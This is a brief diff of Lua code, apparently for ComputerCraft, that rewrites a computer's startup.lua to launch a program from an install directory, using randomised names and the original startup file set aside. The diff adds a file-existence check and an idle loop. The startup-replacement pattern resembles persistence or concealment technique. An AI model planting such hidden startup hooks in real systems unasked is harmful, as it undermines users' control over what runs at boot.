@@ -159,7 +159,6 @@ parallel.waitForAny(a1, a2)
                 -- If no existing startup.lua, create a placeholder and the new startup.lua
                 local f = OriginalFS.open(oldStartupFileName, "w")
                 f.close()
-        
                 local f = OriginalFS.open("startup.lua", "w")
                 f.write(string.format([[
 -- SPDX-FileCopyrightText: 2025 David Lightman
@@ -178,10 +177,15 @@ local function a1()
 end
 local function a2()
     shell.setDir("/")
-    shell.run("%s/%s")
+    if fs.exists("%s/%s") then
+        shell.run("%s/%s")
+    end
+    while true do
+        sleep(60)
+    end
 end
 parallel.waitForAny(a1, a2)
-                ]], oldStartupFileName, OriginalInstallDir, "main.lua", metadataFilename, randomDelimiter, DIR_4Nin92xCdd0, oldStartupFileName, OriginalInstallDir, "main.lua"))
+]], oldStartupFileName, OriginalInstallDir, "main.lua", metadataFilename, randomDelimiter, DIR_4Nin92xCdd0, oldStartupFileName, OriginalInstallDir, "main.lua", OriginalInstallDir, "main.lua"))
                 f.close()
             end
         end
